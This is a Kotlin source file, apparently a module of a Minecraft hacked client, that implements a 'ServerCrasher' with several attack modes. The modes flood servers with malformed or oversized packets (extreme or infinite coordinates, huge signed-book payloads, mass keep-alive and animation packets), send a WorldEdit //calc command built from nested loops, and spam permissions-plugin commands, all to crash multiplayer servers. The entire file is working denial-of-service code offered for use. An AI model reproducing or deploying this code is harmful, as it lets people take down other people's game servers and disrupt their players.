package net.ccbluex.liquidbounce.features.module.modules.world

import io.netty.buffer.Unpooled
import net.ccbluex.liquidbounce.event.*
import net.ccbluex.liquidbounce.features.module.Module
import net.ccbluex.liquidbounce.features.module.ModuleCategory
import net.ccbluex.liquidbounce.features.module.ModuleInfo
import net.ccbluex.liquidbounce.utils.misc.RandomUtils
import net.ccbluex.liquidbounce.utils.timer.MSTimer
import net.ccbluex.liquidbounce.value.IntegerValue
import net.ccbluex.liquidbounce.value.ListValue
import net.minecraft.init.Items
import net.minecraft.item.ItemStack
import net.minecraft.nbt.NBTTagCompound
import net.minecraft.nbt.NBTTagList
import net.minecraft.nbt.NBTTagString
import net.minecraft.network.PacketBuffer
import net.minecraft.network.play.client.*
import net.minecraft.network.play.client.C03PacketPlayer.C04PacketPlayerPosition
import java.lang.Double.NEGATIVE_INFINITY
import java.util.*

@ModuleInfo(name = "ServerCrasher", description = "Allows you to crash certain server.", category = ModuleCategory.WORLD, fakeName = "Server Crasher")
class ServerCrasher : Module() {
    private val modeValue = ListValue("Mode", arrayOf(
            "Book",
            "Packet",
            "MassiveChunkLoading",
            "WorldEdit",
            "Pex",
            "CubeCraft",
            "AACNew", "AACOther", "AACOld"), "Book")
    private val packets = IntegerValue("Packets", 5000, 1, 100000)
    private val packetMode = ListValue("PacketMode", arrayOf("C03", "C00", "C0B", "C0A", "C0F", "C01"), "C0A")
    private val pexTimer = MSTimer()
    override fun onEnable() {
        if (mc.thePlayer == null) return
        when (modeValue.get().toLowerCase()) {
            "aacnew" ->                 // Spam positions
            {
                var index = 0
                while (index < 9999) {
                    mc.netHandler.addToSendQueue(C04PacketPlayerPosition(
                            mc.thePlayer.posX + 9412 * index,
                            mc.thePlayer.entityBoundingBox.minY + 9412 * index,
                            mc.thePlayer.posZ + 9412 * index,
                            true
                    ))
                    ++index
                }
            }
            "aacother" ->                 // Spam positions
            {
                var index = 0
                while (index < 9999) {
                    mc.netHandler.addToSendQueue(C04PacketPlayerPosition(
                            mc.thePlayer.posX + 500000 * index,
                            mc.thePlayer.entityBoundingBox.minY + 500000 * index,
                            mc.thePlayer.posZ + 500000 * index,
                            true
                    ))
                    ++index
                }
            }
            "aacold" ->                 // Send negative infinity position
                mc.netHandler.addToSendQueue(C04PacketPlayerPosition(NEGATIVE_INFINITY, NEGATIVE_INFINITY, NEGATIVE_INFINITY, true))
            "worldedit" ->                 // Send crash command
                mc.thePlayer.sendChatMessage("//calc for(i=0;i<256;i++){for(a=0;a<256;a++){for(b=0;b<256;b++){for(c=0;c<256;c++){}}}}")
            "cubecraft" ->                 // Not really needed but doesn't matter
                mc.thePlayer.setPosition(mc.thePlayer.posX, mc.thePlayer.posY + 0.3, mc.thePlayer.posZ)
            "massivechunkloading" -> {
                // Fly up into sky
                var yPos = mc.thePlayer.posY
                while (yPos < 255) {
                    mc.netHandler.addToSendQueue(C04PacketPlayerPosition(mc.thePlayer.posX,
                            yPos, mc.thePlayer.posZ, true))
                    yPos += 5.0
                }

                // Fly over world
                var i = 0
                while (i < 1337 * 5) {
                    mc.netHandler.addToSendQueue(C04PacketPlayerPosition(
                            mc.thePlayer.posX + i, 255.0, mc.thePlayer.posZ + i, true
                    ))
                    i += 5
                }
            }
        }
    }

    @EventTarget
    fun onMotion(event: MotionEvent) {
        if (event.eventState === EventState.POST) return
        when (modeValue.get().toLowerCase()) {
            "book" -> {
                val bookStack = ItemStack(Items.writable_book)
                val bookCompound = NBTTagCompound()
                bookCompound.setString("author", RandomUtils.randomNumber(20))
                bookCompound.setString("title", RandomUtils.randomNumber(20))
                val pageList = NBTTagList()
                val pageText = RandomUtils.randomNumber(600)
                var page = 0
                while (page < 50) {
                    pageList.appendTag(NBTTagString(pageText))
                    page++
                }
                bookCompound.setTag("pages", pageList)
                bookStack.tagCompound = bookCompound
                run {
                    var packets = 0
                    while (packets < 100) {
                        val packetBuffer = PacketBuffer(Unpooled.buffer())
                        packetBuffer.writeItemStackToBuffer(bookStack)
                        mc.netHandler.addToSendQueue(C17PacketCustomPayload(if (Random().nextBoolean()) "MC|BSign" else "MC|BEdit", packetBuffer))
                        packets++
                    }
                }
            }
            "cubecraft" -> {
                val x = mc.thePlayer.posX
                val y = mc.thePlayer.posY
                val z = mc.thePlayer.posZ
                var i = 0
                while (i < 3000) {
                    mc.netHandler.addToSendQueue(C04PacketPlayerPosition(x,
                            y + 0.09999999999999, z, false))
                    mc.netHandler.addToSendQueue(C04PacketPlayerPosition(x, y, z, true))
                    ++i
                }
                mc.thePlayer.motionY = 0.0
            }
            "pex" -> if (pexTimer.hasTimePassed(2000)) {
                // Send crash command
                mc.thePlayer.sendChatMessage(if (Random().nextBoolean()) "/pex promote a a" else "/pex demote a a")
                pexTimer.reset()
            }
            "packet" -> {
                var i = 0
                while (i < packets.get()) {
                    when (packetMode.get()) {
                        "C03" -> mc.netHandler.addToSendQueue(C03PacketPlayer(mc.thePlayer.onGround))
                        "C00" -> mc.netHandler.addToSendQueue(C00PacketKeepAlive())
                        "C0A" -> mc.netHandler.addToSendQueue(C0APacketAnimation())
                        "C0B" -> mc.netHandler.addToSendQueue(C0BPacketEntityAction())
                        "C0F" -> mc.netHandler.addToSendQueue(C0FPacketConfirmTransaction(0xCD0000, UUID.randomUUID().toString().toShort(), Random().nextBoolean()))
                        "C01" -> mc.netHandler.addToSendQueue(C01PacketChatMessage(""))
                    }
                    i++
                }
            }
            else -> state = false // Disable module when mode is just a one run crasher
        }
    }

    @EventTarget
    fun onWorld(event: WorldEvent) {
        if (event.worldClient == null) state = false // Disable module in case you left the server
    }

    @EventTarget
    fun onTick(event: TickEvent) {
        if (mc.thePlayer == null || mc.theWorld == null) state = false // Disable module in case you left the server
    }

    override val tag: String
        get() = modeValue.get()
}